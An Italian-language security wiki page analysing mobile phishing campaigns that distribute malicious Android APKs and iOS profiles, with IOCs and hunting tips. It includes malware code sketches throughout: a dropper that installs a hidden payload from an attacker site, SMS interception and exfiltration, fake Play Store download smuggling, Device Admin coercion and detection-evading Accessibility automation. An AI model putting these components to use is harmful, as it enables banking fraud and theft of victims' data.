# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre tecniche utilizzate da threat actors per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e altre ricerche pubbliche.

## Flusso dell'attacco

1. **SEO/Phishing Infrastructure**
* Registrare decine di domini simili (siti di incontri, condivisione cloud, servizi auto…).
– Usare parole chiave nella lingua locale e emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* istruzioni di installazione Android (`.apk`) che iOS sulla stessa landing page.
2. **Download di prima fase**
* Android: link diretto a un APK *non firmato* o di “store di terze parti”.
* iOS: `itms-services://` o link HTTPS semplice a un profilo **mobileconfig** malevolo (vedi sotto).
3. **Ingegneria sociale post-installazione**
* Al primo avvio l'app richiede un **codice di invito / verifica** (illusione di accesso esclusivo).
* Il codice viene inviato via POST su HTTP al Command-and-Control (C2).
* Il C2 risponde `{"success":true}` ➜ il malware continua.
* Analisi dinamica Sandbox/AV che non invia mai un codice valido non osserva **comportamento malevolo** (evasione).
4. **Abuso delle autorizzazioni a runtime (Android)**
* Le autorizzazioni pericolose vengono richieste solo **dopo una risposta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il percorso di codice Java/Kotlin che legge gli SMS tramite reflection ⇒ abbassa il punteggio statico pur restando funzionale su dispositivi che concedono il permesso tramite abuso di `AppOps` o vecchi target.
5. **Interfaccia di facciata & raccolta in background**
* L'app mostra viste innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, numero di telefono
- Dump completo di `ContactsContract` (array JSON)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre la dimensione
- Contenuto SMS opzionale (`content://sms`)
I payload vengono compressi in batch e inviati via `HTTP POST /upload.php`.
6. **Tecnica di distribuzione iOS**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per iscrivere il dispositivo in una supervisione simile a “MDM”.
* Istruzioni di social-engineering:
1. Aprire Settings ➜ *Profile downloaded*.
2. Toccare *Install* tre volte (screenshot sulla pagina di phishing).
3. Trust the unsigned profile ➜ l'attaccante ottiene l'entitlement *Contacts* & *Photo* senza revisione dell'App Store.
7. **Livello di rete**
* HTTP non cifrato, spesso sulla porta 80 con header HOST come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Consigli per il Red Team

* **Dynamic Analysis Bypass** – Durante l'analisi del malware, automatizzare la fase del codice di invito con Frida/Objection per raggiungere il ramo malevolo.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con il runtime `PackageManager#getRequestedPermissions()`; l'assenza di dangerous perms (permessi pericolosi) è un campanello d'allarme.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare burst di POST sospetti dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlements eccessive.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass del codice di invito</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Catena di distribuzione attraverso piattaforme affidabili
- Video esca su YouTube → la descrizione contiene un short link
- Shortlink → sito di phishing su GitHub Pages che imita il portale legittimo
- Lo stesso repo GitHub ospita un APK con un falso badge “Google Play” che punta direttamente al file
- Pagine di phishing dinamiche ospitate su Replit; il canale di comando remoto usa Firebase Cloud Messaging (FCM)

### Dropper con embedded payload e installazione offline
- Il primo APK è un installer (dropper) che include il malware reale in `assets/app.apk` e invita l'utente a disattivare Wi‑Fi/mobile data per attenuare il rilevamento cloud.
- L'embedded payload si installa sotto un'etichetta innocua (es. “Secure Update”). Dopo l'installazione, sia l'installer sia il payload sono presenti come app separate.

Suggerimento per triage statico (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint tramite shortlink
- Malware recupera un elenco in testo in chiaro, separato da virgole, di endpoint attivi da uno shortlink; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocodice:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Il passaggio “Make payment of ₹1 / UPI‑Lite” carica un form HTML dell'attaccante dall'endpoint dinamico all'interno di un WebView e cattura i campi sensibili (telefono, banca, UPI PIN) che vengono `POST`ati a `addup.php`.

Loader minimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Al primo avvio vengono richieste autorizzazioni aggressive:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono ciclati per inviare massivamente SMS di smishing dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con metadati (mittente, corpo, slot SIM, ID casuale per dispositivo) a `/addsm.php`.

Bozza del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra su FCM; i messaggi push contengono un campo `_type` usato come switch per attivare azioni (es., aggiornare modelli di testo per phishing, attivare/disattivare comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Bozza del handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contiene un payload secondario in `assets/app.apk`
- WebView carica pagamenti da `gate.htm` ed esfiltra verso `/addup.php`
- Esfiltrazione SMS verso `/addsm.php`
- Fetch di configurazione guidato da shortlink (es., `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate genericamente come “Update/Secure Update”
- Messaggi FCM `data` con un discriminatore `_type` in app non attendibili

---

## Smuggling di APK basato su Socket.IO/WebSocket + Pagine false di Google Play

Gli attaccanti sostituiscono sempre più spesso i link APK statici con un canale Socket.IO/WebSocket incorporato in esche che imitano Google Play. Questo nasconde l'URL del payload, bypassa i filtri su URL/estensioni e mantiene un'esperienza di installazione realistica.

Flusso tipico lato client osservato nel mondo reale:

<details>
<summary>Downloader finto per Google Play via Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché elude i controlli semplici:
- Nessun URL APK statico è esposto; il payload viene ricostruito in memoria dai frame WebSocket.
- I filtri URL/MIME/estensione che bloccano risposte .apk dirette possono non rilevare dati binari veicolati tramite WebSockets/Socket.IO.
- I crawler e le sandbox URL che non eseguono WebSockets non recupereranno il payload.

Vedi anche WebSocket tradecraft e tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abuso Android Accessibility/Overlay e Device Admin, automazione ATS e orchestrazione relay NFC – caso di studio RatOn

La campagna RatOn banker/RAT (ThreatFabric) è un esempio concreto di come le moderne operazioni di mobile phishing combinino WebView droppers, Accessibility-driven UI automation, overlays/ransom, coercizione tramite Device Admin, Automated Transfer System (ATS), takeover di crypto wallet e perfino NFC-relay orchestration. Questa sezione astrae le tecniche riutilizzabili.

### Stage-1: WebView → bridge di installazione nativo (dropper)
Gli attacker presentano una WebView che punta a una pagina attacker e iniettano un'interfaccia JavaScript che espone un installer nativo. Un tap su un bottone HTML richiama il codice nativo che installa un APK di seconda fase incluso negli assets del dropper e lo avvia direttamente.

Schema minimo:

<details>
<summary>Pattern minimo dropper Stage-1 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sulla pagina:
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity esplicito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: app non attendibili che chiamano `addJavascriptInterface()` ed espongono metodi simili a installer a WebView; APK che include un payload secondario incorporato sotto `assets/` e invoca la Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 apre un WebView che ospita una pagina “Access”. Il suo pulsante invoca un metodo esportato che porta la vittima nelle impostazioni Accessibility e richiede l'abilitazione del servizio malevolo. Una volta concesso, il malware usa Accessibility per effettuare automaticamente click attraverso i successivi dialog di permesso runtime (contatti, overlay, gestione impostazioni di sistema, ecc.) e richiede Device Admin.

- Accessibility aiuta programmaticamente ad accettare prompt successivi trovando pulsanti come “Allow”/“OK” nell'albero dei nodi e inviando click.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vedi anche:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Gli operatori possono inviare comandi per:
- renderizzare un overlay a schermo intero da un URL, o
- inviare HTML inline che viene caricato in un overlay WebView.

Usi probabili: coercizione (inserimento PIN), apertura del wallet per catturare i PIN, messaggistica di riscatto. Tenere un comando per verificare che l'autorizzazione overlay sia concessa se manca.

### Remote control model – text pseudo-screen + screen-cast
- Bassa banda: eseguire periodicamente il dump dell'albero di nodi Accessibility, serializzare i testi/ruoli/bounds visibili e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` una tantum e `screen_live` in continuo).
- Alta fedeltà: richiedere MediaProjection e avviare screen-casting/recording su richiesta (comandi come `display` / `record`).

### ATS playbook (automazione app bancarie)
Dato un task JSON, aprire l'app bancaria, guidare la UI tramite Accessibility con un mix di query testuali e tap su coordinate, e inserire il payment PIN della vittima quando richiesto.

Esempio di task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Esempi di testi visti in un flusso target (CZ → EN):
- "Nová platba" → "Nuovo pagamento"
- "Zadat platbu" → "Inserisci pagamento"
- "Nový příjemce" → "Nuovo beneficiario"
- "Domácí číslo účtu" → "Numero di conto domestico"
- "Další" → "Avanti"
- "Odeslat" → "Invia"
- "Ano, pokračovat" → "Sì, continua"
- "Zaplatit" → "Paga"
- "Hotovo" → "Fatto"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Estrazione della seed dai wallet crypto
Obiettivi come MetaMask, Trust Wallet, Blockchain.com, Phantom. Flusso: sbloccare (PIN rubato o password fornita), navigare in Sicurezza/Recupero, rivelare/mostrare seed phrase, keylog/exfiltrate it. Implementare selettori sensibili alla localizzazione (EN/RU/CZ/SK) per stabilizzare la navigazione tra le lingue.

### Coercizione Device Admin
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Blocco immediato:
```java
dpm.lockNow();
```
- Far scadere la credenziale corrente per forzare la modifica (Accessibility cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Molti controlli di DevicePolicyManager richiedono Device Owner/Profile Owner sulle versioni recenti di Android; alcune build OEM possono essere permissive. Verificare sempre sul target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 può installare e avviare un modulo NFC-relay esterno (es., NFSkate) e persino passargli un template HTML per guidare la vittima durante il relay. Questo abilita cash-out contactless card-present insieme ad ATS online.

Contesto: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/stato: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Sovrapposizioni: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Gli attori della minaccia mixano sempre più l'automazione basata su Accessibility con anti-detection tarati contro semplici biometrie comportamentali. Un recente banker/RAT presenta due modalità complementari di invio testo e un toggle per l'operatore per simulare la digitazione umana con cadenza randomizzata.

- Modalità Discovery: enumerare i nodi visibili con selector e bounds per mirare con precisione gli input (ID, text, contentDescription, hint, bounds) prima di agire.
- Doppia iniezione di testo:
- Modalità 1 – `ACTION_SET_TEXT` direttamente sul nodo target (stabile, senza tastiera);
- Modalità 2 – impostazione della clipboard + `ACTION_PASTE` nel nodo focalizzato (funziona quando il setText diretto è bloccato).
- Cadenza simile a umana: suddividere la stringa fornita dall'operatore e inviarla carattere per carattere con ritardi randomizzati di 300–3000 ms tra gli eventi per eludere le euristiche di “machine-speed typing”. Implementato o crescendo progressivamente il valore via `ACTION_SET_TEXT`, o incollando un carattere alla volta.

<details>
<summary>Bozza Java: scoperta dei nodi + input ritardato per carattere tramite setText o clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlay di blocco per copertura di frode:
- Renderizzare un full-screen `TYPE_ACCESSIBILITY_OVERLAY` con opacità controllata dall'operatore; mantenerlo opaco per la vittima mentre l'automazione remota procede sotto.
- Comandi tipicamente esposti: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimo con alpha regolabile:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitive di controllo dell'operatore spesso viste: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (condivisione dello schermo).

## Riferimenti

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
